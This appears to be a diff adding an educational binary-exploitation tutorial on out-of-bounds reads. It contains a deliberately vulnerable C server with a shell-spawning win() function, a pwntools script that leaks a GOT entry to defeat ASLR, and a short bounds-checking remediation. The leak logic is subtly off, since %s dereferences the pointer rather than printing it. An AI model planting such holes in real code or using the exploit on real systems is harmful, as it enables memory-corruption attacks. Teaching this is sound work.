@@ -1,1 +1,139 @@
+An Arbitrary Read or Information Leak (Infoleak) vulnerability is a critical primitive in modern binary exploitation. With defenses like ASLR (Address Space Layout Randomization) and PIE (Position Independent Executable) enabled, memory addresses are randomized every time a program runs. You cannot hijack execution without knowing where your target functions or libraries are located.
+An arbitrary read allows you to bypass these defenses by viewing specific runtime addresses, calculating the randomized base offset, and reconstructing the memory map of the running process.
+
+1. Common Mechanisms for Arbitrary Reads
+
+Information leaks generally manifest in two ways:
+• Format String Read: Utilizing specifiers like %s or Direct Parameter Access (%12$s) to treat an address sitting on the stack as a pointer and dereference it.
+• Out-of-Bounds (OOB) Read: Manipulating an index or length field (such as an unchecked array boundary or a length property in a custom protocol) to force the program to transmit bytes residing beyond the legal buffer limits.
+
+2. The Vulnerable C Program (leak_vuln.c)
+
+This server simulates a structured database engine. It contains a classic OOB Read flaw: it reads an index position from the user but fails to validate if that index is negative or larger than the array boundaries.
+c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+void win() {
+    printf("[+] Target achieved! Spawning root shell...\n");
+    system("/bin/sh");
+}
+
+// Global array allocated in the data/bss segment
+char *database_entries[4] = {
+    "Record 0: Public Data",
+    "Record 1: Public Data",
+    "Record 2: Public Data",
+    "Record 3: Public Data"
+};
+
+void query_database() {
+    int index;
+    printf("Enter record index to read: ");
+    if (scanf("%d", &index) != 1) return;
+    getchar(); // Clear newline
+
+    // VULNERABILITY: No upper or lower bounds check on 'index'!
+    // If we pass an arbitrary offset, the program will print the pointer 
+    // sitting at: database_entries + (index * sizeof(char*))
+    printf("Data: %s\n", database_entries[index]);
+}
+
+int main() {
+    setbuf(stdout, NULL);
+    // Print the address of the array to make finding the relative offsets easier
+    printf("Database array base address: %p\n", (void*)&database_entries);
+    query_database();
+    return 0;
+}
+Use code with caution.
+
+Compilation Flag Note
+
+bash
+gcc -m32 -no-pie leak_vuln.c -o leak_vuln
+Use code with caution.
+
+3. Calculating the Arbitrary Target Location
+
+We want to use this OOB read to leak the address of the win() function or a standard library function pointer from the Global Offset Table (GOT) to bypass randomization.
+text
+       Lower Memory Address
+       +------------------------------------+
+
+       |  Global Offset Table (GOT) entry   | <-- TARGET: e.g., printf() pointer
+       +------------------------------------+
+
+       |  ... intermediate memory space ... |
+       +------------------------------------+
+
+       |  database_entries[0]               | <-- Base reference index (0)
+       +------------------------------------+
+       Higher Memory Address
+Use code with caution.
+If we know the static distance between database_entries and our target pointer (found via tools like objdump or Ghidra), we can pass a negative index to step backwards through memory, land directly on the pointer, and print it as a string (%s).
+
+4. The Python Leak Exploit Script (infoleak.py)
+
+This pwntools script tracks down the runtime address of a target library function by calculating the precise structural memory offset.
+python
+#!/usr/bin/env python3
+from pwn import *
+
+# Initialize context and process
+context.update(arch='i386', os='linux')
+io = process('./leak_vuln')
+
+# 1. Parse the leaked runtime base address of our array
+io.recvuntil(b"Database array base address: ")
+array_base = int(io.recvline().strip(), 16)
+log.info(f"Array Base Location: {hex(array_base)}")
+
+# 2. Identify target addresses from static analysis
+# Let's say via objdump we find the GOT entry for printf sits at 0x0804c00c, 
+# and database_entries sits at 0x0804c020.
+database_entries_static = 0x0804c020
+printf_got_static = 0x0804c00c
+
+# Calculate how many bytes we need to move backwards
+byte_distance = printf_got_static - database_entries_static # Negative value
+
+# Convert bytes to an array index offset (each pointer is 4 bytes on 32-bit systems)
+target_index = int(byte_distance / 4)
+log.info(f"Calculated relative OOB index to target pointer: {target_index}")
+
+# 3. Deploy the index payload to execute the arbitrary read
+io.recvuntil(b"Enter record index to read: ")
+io.sendline(str(target_index).encode())
+
+# 4. Extract the leaked raw memory address bytes
+io.recvuntil(b"Data: ")
+leaked_raw = io.recvline().strip()
+
+# Convert the raw string bytes back into a 32-bit integer address
+# u32() pads trailing null bytes if the address starts with zeros
+printf_runtime_address = u32(leaked_raw.ljust(4, b"\x00")[:4])
+log.success(f"Successfully leaked printf() real-time address: {hex(printf_runtime_address)}")
+
+# 5. Calculate base offsets on the fly
+# Once you have a valid library address, you can calculate the exact location of 
+# system() or a win() block regardless of ASLR level:
+# libc_base = printf_runtime_address - libc.symbols['printf']
+
+io.close()
+Use code with caution.
+
+5. Architectural Mitigations for Memory Leaks
+
+Remediating arbitrary reads requires treating boundaries as absolute logical barriers:
+• Strict Array Bounds Enforcements: Always validate that indices sit cleanly inside both the maximum and minimum boundaries of an array container before accessing the pointer address:c
+// Secure indexing constraint
+if (index < 0 || index >= MAX_ENTRIES) {
+    printf("[-] Critical Error: Index Out of Bounds.\n");
+    return;
+}
+Use code with caution.
+• Utilize Memory-Safe Primitives: When building output loops or custom serialization parsers, avoid referencing unsafe pointer math directly. Rely instead on length-verified structures or standardized encapsulation models that automatically validate alignment rules at the compiler level.
 
